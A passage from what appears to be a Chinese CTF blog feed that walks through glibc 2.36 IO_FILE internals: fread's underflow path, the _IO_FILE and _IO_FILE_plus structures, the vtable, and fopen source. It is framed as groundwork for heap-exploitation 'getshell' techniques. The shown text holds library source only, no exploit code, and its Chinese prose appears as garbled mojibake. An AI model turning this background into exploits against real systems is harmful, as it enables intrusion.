class="hljs-keyword">return</span> EOF;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>  <span class="hljs-keyword">if</span> (_IO_in_backup (fp))<br>    &#123;<br>      _IO_switch_to_main_get_area (fp);<br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br><span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (_IO_have_markers (fp))<br>    &#123;<br>      <span class="hljs-keyword">if</span> (save_for_backup (fp, fp-&gt;_IO_read_end))<br><span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_IO_have_backup (fp))<br>    _IO_free_backup_area (fp);<br>  <span class="hljs-keyword">return</span> _IO_UNDERFLOW (fp);<br>&#125;<br>libc_hidden_def (__underflow)<br></code></pre></td></tr></table></figure><p>åœ¨å¯¹<strong>flag</strong>è¿›è¡Œä¸€ç³»åˆ—æ£€æµ‹åï¼Œä¼šè°ƒç”¨<code>_IO_UNDERFLOW</code>å‡½æ•°ï¼ŒåŒæ ·åˆ©ç”¨åŠ¨è°ƒï¼Œæˆ‘ä»¬æ‰¾åˆ°è¿™ä¸ªå‡½æ•°å°±æ˜¯<code>_IO_file_underflow</code>ï¼Œå®é™…åœ¨æºç ä¸­ä¸º<code>_IO_new_file_underflow</code></p><p><img src="/img/article/fread/image-20221207200035078.png" alt="image-20221207200035078"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L460</span><br><span class="hljs-type">int</span><br>_IO_new_file_underflow (FILE *fp)<br>&#123;<br>  <span class="hljs-type">ssize_t</span> count;<br><br>  <span class="hljs-comment">/* C99 requires EOF to be &quot;sticky&quot;.  */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_EOF_SEEN)<br>    <span class="hljs-keyword">return</span> EOF;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; _IO_NO_READS)<br>    &#123;<br>      fp-&gt;_flags |= _IO_ERR_SEEN;<br>      __set_errno (EBADF);<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_read_ptr &lt; fp-&gt;_IO_read_end)<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br><br>  <span class="hljs-keyword">if</span> (fp-&gt;_IO_buf_base == <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Maybe we already have a push back pointer.  */</span><br>      <span class="hljs-keyword">if</span> (fp-&gt;_IO_save_base != <span class="hljs-literal">NULL</span>)<br>&#123;<br>  <span class="hljs-built_in">free</span> (fp-&gt;_IO_save_base);<br>  fp-&gt;_flags &amp;= ~_IO_IN_BACKUP;<br>&#125;<br>      _IO_doallocbuf (fp);<br>    &#125;<br><br>  <span class="hljs-comment">/* FIXME This can/should be moved to genops ?? */</span><br>  <span class="hljs-keyword">if</span> (fp-&gt;_flags &amp; (_IO_LINE_BUF|_IO_UNBUFFERED))<br>    &#123;<br>      <span class="hljs-comment">/* We used to flush all line-buffered stream.  This really isn&#x27;t</span><br><span class="hljs-comment"> required by any standard.  My recollection is that</span><br><span class="hljs-comment"> traditional Unix systems did this for stdout.  stderr better</span><br><span class="hljs-comment"> not be line buffered.  So we do just that here</span><br><span class="hljs-comment"> explicitly.  --drepper */</span><br>      _IO_acquire_lock (<span class="hljs-built_in">stdout</span>);<br><br>      <span class="hljs-keyword">if</span> ((<span class="hljs-built_in">stdout</span>-&gt;_flags &amp; (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF))<br>  == (_IO_LINKED | _IO_LINE_BUF))<br>_IO_OVERFLOW (<span class="hljs-built_in">stdout</span>, EOF);<br><br>      _IO_release_lock (<span class="hljs-built_in">stdout</span>);<br>    &#125;<br><br>  _IO_switch_to_get_mode (fp);<br><br>  <span class="hljs-comment">/* This is very tricky. We have to adjust those</span><br><span class="hljs-comment">     pointers before we call _IO_SYSREAD () since</span><br><span class="hljs-comment">     we may longjump () out while waiting for</span><br><span class="hljs-comment">     input. Those pointers may be screwed up. H.J. */</span><br>  fp-&gt;_IO_read_base = fp-&gt;_IO_read_ptr = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_read_end = fp-&gt;_IO_buf_base;<br>  fp-&gt;_IO_write_base = fp-&gt;_IO_write_ptr = fp-&gt;_IO_write_end<br>    = fp-&gt;_IO_buf_base;<br><br>  count = _IO_SYSREAD (fp, fp-&gt;_IO_buf_base,<br>       fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base);<br>  <span class="hljs-keyword">if</span> (count &lt;= <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>fp-&gt;_flags |= _IO_EOF_SEEN;<br>      <span class="hljs-keyword">else</span><br>fp-&gt;_flags |= _IO_ERR_SEEN, count = <span class="hljs-number">0</span>;<br>  &#125;<br>  fp-&gt;_IO_read_end += count;<br>  <span class="hljs-keyword">if</span> (count == <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/* If a stream is read to EOF, the calling application may switch active</span><br><span class="hljs-comment"> handles.  As a result, our offset cache would no longer be valid, so</span><br><span class="hljs-comment"> unset it.  */</span><br>      fp-&gt;_offset = _IO_pos_BAD;<br>      <span class="hljs-keyword">return</span> EOF;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (fp-&gt;_offset != _IO_pos_BAD)<br>    _IO_pos_adjust (fp-&gt;_offset, count);<br>  <span class="hljs-keyword">return</span> *(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *) fp-&gt;_IO_read_ptr;<br>&#125;<br>libc_hidden_ver (_IO_new_file_underflow, _IO_file_underflow)<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°ä¸»è¦åšäº†è¿™å‡ ä»¶äº‹ï¼š</p><ul><li>é¦–å…ˆè¿›è¡Œä¸€äº›æ£€æŸ¥ï¼ŒåŒ…æ‹¬<strong>flag</strong>ä»¥åŠä¸€äº›æŒ‡é’ˆçš„åˆæ³•æ€§</li><li>ç„¶åå¯¹ <strong>_IO_read_baseï¼Œ _IO_read_ptrï¼Œ _IO_read_endï¼Œ _IO_write_base</strong>æŒ‡é’ˆå‡è®¾ç½®ä¸º <strong>fp-&gt;_IO_buf_base</strong></li><li>è°ƒç”¨<code>_IO_SYSREAD </code> ,è¯¥å‡½æ•°æœ€ç»ˆæ‰§è¡Œç³»ç»Ÿè°ƒç”¨readï¼Œè¯»å–æ–‡ä»¶æ•°æ®ï¼Œæ•°æ®è¯»å…¥åˆ°<code>fp-&gt;_IO_buf_base</code>ä¸­ï¼Œè¯»å…¥å¤§å°ä¸ºè¾“å…¥ç¼“å†²åŒºçš„å¤§å°<code>fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base</code>ã€‚</li><li>è®¾ç½®è¾“å…¥ç¼“å†²åŒºå·²æœ‰æ•°æ®çš„sizeï¼Œå³è®¾ç½®<code>fp-&gt;_IO_read_end</code>ä¸º<code>fp-&gt;_IO_read_end += count</code>ã€‚</li></ul><p>éšåä¸æ–­é€€å‡ºå‡½æ•°ï¼Œç›´è‡³ç»“æŸ</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€IO_FILEã€‘æºç è¯¦è§£</title>
    <link href="/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/"/>
    <url>/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/</url>
    
    <content type="html"><![CDATA[<blockquote><p>ç”±äºglibcç‰ˆæœ¬çš„ä¸æ–­æ›´æ–°ï¼Œå¸¸è§å‡ ç§hookåœ¨glibc2.34ç»ˆè¢«èˆå»ï¼Œæˆ‘ä»¬æ€¥éœ€ä¸€ç§èƒ½å¤Ÿåœ¨é«˜ç‰ˆæœ¬çš„glibcä¸‹ä»èƒ½æœ‰æ•ˆçš„getshellæ–¹æ³•ã€‚è€ŒIO_FILEä½œä¸ºheapé¢˜ç›®çš„è¿›é˜¶æŠ€èƒ½é€æ¸å¼•èµ·å¤§å®¶æ³¨æ„ï¼Œå¸å¼•äº†è®¸å¤šå¤§ä½¬æŠ•å…¥å…¶ä¸­ã€‚ä»…åœ¨åœ¨2021-2022å¹´æœŸé—´å°±å‡ºç°å‡ºç°äº†å¤§é‡ä»¥IO_FILEä¸ºåŸºç¡€çš„è°ƒç”¨é“¾åˆ©ç”¨æ–¹å¼ï¼Œåœ¨æ¯”èµ›ä¸­ä¹Ÿé€æ¸æˆä¸ºäº†å½“ä¸‹heapé¢˜ç›®çš„ä¸»æµgetshellæ–¹å¼ã€‚æœ¬æ–‡ä»¥glibc2.36ä¸ºä¾‹ï¼Œä»ç›¸å…³ç»“æ„ä½“ä»¥åŠfopenå‡½æ•°æºç å…¥æ‰‹ï¼Œè¯¦ç»†ä»‹ç»IO_FILEç›¸å…³çŸ¥è¯†ç‚¹ã€‚</p></blockquote><h2 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h2><p>IO_FILEç»“æ„ä½“å®šä¹‰ä¸º<code>struct _IO_FILE</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* The tag name of this struct is _IO_FILE to preserve historic</span><br><span class="hljs-comment">   C++ mangled names for functions taking FILE* arguments.</span><br><span class="hljs-comment">   That name should not be used in new code.  */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">int</span> _flags;<span class="hljs-comment">/* High-order word is _IO_MAGIC; rest is flags. */</span><br><br>  <span class="hljs-comment">/* The following pointers correspond to the C++ streambuf protocol. */</span><br>  <span class="hljs-type">char</span> *_IO_read_ptr;<span class="hljs-comment">/* Current read pointer */</span><br>  <span class="hljs-type">char</span> *_IO_read_end;<span class="hljs-comment">/* End of get area. */</span><br>  <span class="hljs-type">char</span> *_IO_read_base;<span class="hljs-comment">/* Start of putback+get area. */</span><br>  <span class="hljs-type">char</span> *_IO_write_base;<span class="hljs-comment">/* Start of put area. */</span><br>  <span class="hljs-type">char</span> *_IO_write_ptr;<span class="hljs-comment">/* Current put pointer. */</span><br>  <span class="hljs-type">char</span> *_IO_write_end;<span class="hljs-comment">/* End of put area. */</span><br>  <span class="hljs-type">char</span> *_IO_buf_base;<span class="hljs-comment">/* Start of reserve area. */</span><br>  <span class="hljs-type">char</span> *_IO_buf_end;<span class="hljs-comment">/* End of reserve area. */</span><br><br>  <span class="hljs-comment">/* The following fields are used to support backing up and undo. */</span><br>  <span class="hljs-type">char</span> *_IO_save_base; <span class="hljs-comment">/* Pointer to start of non-current get area. */</span><br>  <span class="hljs-type">char</span> *_IO_backup_base;  <span class="hljs-comment">/* Pointer to first valid character of backup area */</span><br>  <span class="hljs-type">char</span> *_IO_save_end; <span class="hljs-comment">/* Pointer to end of non-current get area. */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br><br>  <span class="hljs-type">int</span> _fileno;<br>  <span class="hljs-type">int</span> _flags2;<br>  <span class="hljs-type">__off_t</span> _old_offset; <span class="hljs-comment">/* This used to be _offset but it&#x27;s too small.  */</span><br><br>  <span class="hljs-comment">/* 1+column number of pbase(); 0 is unknown. */</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br>  <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br>  <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br><br>  _IO_lock_t *_lock;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> _<span class="hljs-title">file</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  <span class="hljs-type">__off64_t</span> _offset;<br>  <span class="hljs-comment">/* Wide character stream stuff.  */</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_codecvt</span> *_<span class="hljs-title">codecvt</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> *_<span class="hljs-title">wide_data</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">freeres_list</span>;</span><br>  <span class="hljs-type">void</span> *_freeres_buf;<br>  <span class="hljs-type">size_t</span> __pad5;<br>  <span class="hljs-type">int</span> _mode;<br>  <span class="hljs-comment">/* Make sure we don&#x27;t get into trouble again.  */</span><br>  <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">int</span>) - <span class="hljs-number">4</span> * <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">void</span> *) - <span class="hljs-keyword">sizeof</span> (<span class="hljs-type">size_t</span>)];<br>&#125;;<br></code></pre></td></tr></table></figure><p>ç„¶åè®©æˆ‘ä»¬çœ‹è¿™ä¸ªç»“æ„ä¸­çš„ä¸€äº›é‡è¦éƒ¨åˆ†ï¼š</p><ul><li><code>_flags</code>:é«˜ä½å­—ä¸º<code>_IO_MAGIC</code>ï¼Œå‰©ä½™çš„éƒ¨åˆ†æ˜¯flag</li><li><code>_IO_read_ptr</code>æ­£åœ¨ä½¿ç”¨çš„inputç¼“å†²åŒºçš„inputåœ°å€</li><li><code>_IO_read_end</code> inputç¼“å†²åŒºçš„ç»“æŸåœ°å€</li><li><code>_IO_read_base</code> inputç¼“å†²åŒºçš„åŸºå€</li><li><code>_IO_write_base</code> outputç¼“å†²åŒºçš„åŸºå€</li><li><code>_IO_write_ptr</code> æŒ‡å‘è¿˜æ²¡è¾“å‡ºçš„é‚£ä¸ªå­—èŠ‚</li><li><code>_IO_write_end</code> outputç¼“å†²åŒºçš„ç»“æŸåœ°å€</li><li><code>_IO_buf_base</code> inputå’Œoutputç¼“å†²åŒºçš„åŸºå€</li><li><code>_IO_buf_end</code>  inputå’Œoutputç¼“å†²åŒºçš„ç»“æŸåœ°å€</li><li><code>_chain</code> å­˜æ”¾ç€ä¸€ä¸ªå•é“¾è¡¨ï¼Œç”¨äºä¸²è”æ‰€æœ‰çš„file stream</li><li><code>_fileno</code> ä¸æ–‡ä»¶ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦</li><li><code>_vtable_offset</code> å­˜æ”¾è™šè¡¨(virtual table)çš„åç§»</li><li><code>_offset</code> å­˜æ”¾å½“å‰æ–‡ä»¶çš„åç§»</li></ul><h2 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L324</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span></span><br><span class="hljs-class">&#123;</span><br>  FILE file;<br>  <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>è¿™é‡ŒFILEå…¶å®å°±æ˜¯_IO_FILEï¼Œæ¢äº†ä¸ªåå­—ç½¢äº†ï¼Œå¦‚ä¸‹æ‰€ç¤ºã€‚ä¸å¾—ä¸è¯´ï¼Œglibcæºç é‡Œå®å®šä¹‰æ˜¯çœŸçš„å¤šğŸ˜…ï¼Œæœ‰ç‚¹æ¶å¿ƒäººã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/bits/types/FILE.h#L7</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __FILE_defined</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __FILE_defined 1</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span>;</span><br><br><span class="hljs-comment">/* The opaque type of streams.  This is the definition used elsewhere.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> <span class="hljs-title">FILE</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><h2 id="IO-jump-t"><a href="#IO-jump-t" class="headerlink" title="_IO_jump_t"></a>_IO_jump_t</h2><p>å¯ä»¥æ³¨æ„åˆ°ï¼Œåœ¨<code>_IO_FILE_plus</code>ä¸­ï¼Œå‰ä¸€éƒ¨åˆ†æ˜¯<code>_IO_FILE</code>ç»“æ„ä½“ï¼Œåä¸€éƒ¨åˆ†æ˜¯æŒ‡å‘<code>_IO_jump_t</code>ç»“æ„ä½“çš„<strong>vtable</strong>æŒ‡é’ˆï¼Œè¿™é‡Œçš„vtableå°±æ˜¯<strong>virtual table</strong>çš„ç¼©å†™ï¼Œå³æˆ‘ä»¬å¸¸è¯´çš„è™šè¡¨ã€‚æ‰€ä»¥<code>_IO_jump_t</code>å…¶å®å°±æ˜¯è™šè¡¨,æºç å®šä¹‰å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/libioP.h#L293</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br>    JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br>    JUMP_FIELD(_IO_finish_t, __finish);<br>    JUMP_FIELD(_IO_overflow_t, __overflow);<br>    JUMP_FIELD(_IO_underflow_t, __underflow);<br>    JUMP_FIELD(_IO_underflow_t, __uflow);<br>    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br>    <span class="hljs-comment">/* showmany */</span><br>    JUMP_FIELD(_IO_xsputn_t, __xsputn);<br>    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br>    JUMP_FIELD(_IO_seekoff_t, __seekoff);<br>    JUMP_FIELD(_IO_seekpos_t, __seekpos);<br>    JUMP_FIELD(_IO_setbuf_t, __setbuf);<br>    JUMP_FIELD(_IO_sync_t, __sync);<br>    JUMP_FIELD(_IO_doallocate_t, __doallocate);<br>    JUMP_FIELD(_IO_read_t, __read);<br>    JUMP_FIELD(_IO_write_t, __write);<br>    JUMP_FIELD(_IO_seek_t, __seek);<br>    JUMP_FIELD(_IO_close_t, __close);<br>    JUMP_FIELD(_IO_stat_t, __stat);<br>    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br>    JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œ<code>_IO_FILE_plus</code>çš„æ€»ä½“ç»“æ„å¦‚ä¸‹å›¾</p><p><img src="/img/article/fopen/t017448d9547dc07159-1669695992482-3.png" alt="img"></p><h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>è®©æˆ‘ä»¬å¤ç°ä¸€ä¸‹æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶çš„è¿‡ç¨‹ï¼Œä»¥åŠ<code>_IO_FILE</code>ç»“æ„ä½“å¦‚ä½•åˆå§‹åŒ–ï¼Œfopençš„æºç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/include/stdio.h#L191</span><br><br><span class="hljs-keyword">extern</span> FILE *_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span>*, <span class="hljs-type">const</span> <span class="hljs-type">char</span>*);<br><span class="hljs-meta">#   <span class="hljs-keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span><br><br><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L83</span><br><br>FILE *<br>_IO_new_fopen (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode)<br>&#123;<br>  <span class="hljs-keyword">return</span> __fopen_internal (filename, mode, <span class="hljs-number">1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åˆæ˜¯ä¸€ä¸ªå®ç„¶åï¼Œæºç å®é™…å®šä¹‰ä¸º<code>_IO_new_fopen</code>ã€‚</p><blockquote><p>çœŸçˆ±ç”Ÿå‘½ï¼Œè¿œç¦»å®å®šä¹‰</p></blockquote><p>ç„¶åå®ƒä¼šè°ƒç”¨<code>__fopen_internal</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L56</span><br><br>FILE *<br>__fopen_internal (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *mode, <span class="hljs-type">int</span> is32)<br>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">locked_FILE</span></span><br><span class="hljs-class">  &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_plus</span> <span class="hljs-title">fp</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>    _IO_lock_t lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_wide_data</span> <span class="hljs-title">wd</span>;</span><br>  &#125; *new_f = (<span class="hljs-keyword">struct</span> locked_FILE *) <span class="hljs-built_in">malloc</span> (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> locked_FILE));<br><br>  <span class="hljs-keyword">if</span> (new_f == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);<br>  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;<br>  _IO_new_file_init_internal (&amp;new_f-&gt;fp);<br>  <span class="hljs-keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);<br><br>  _IO_un_link (&amp;new_f-&gt;fp);<br>  <span class="hljs-built_in">free</span> (new_f);<br>  <span class="hljs-keyword">return</span> <span 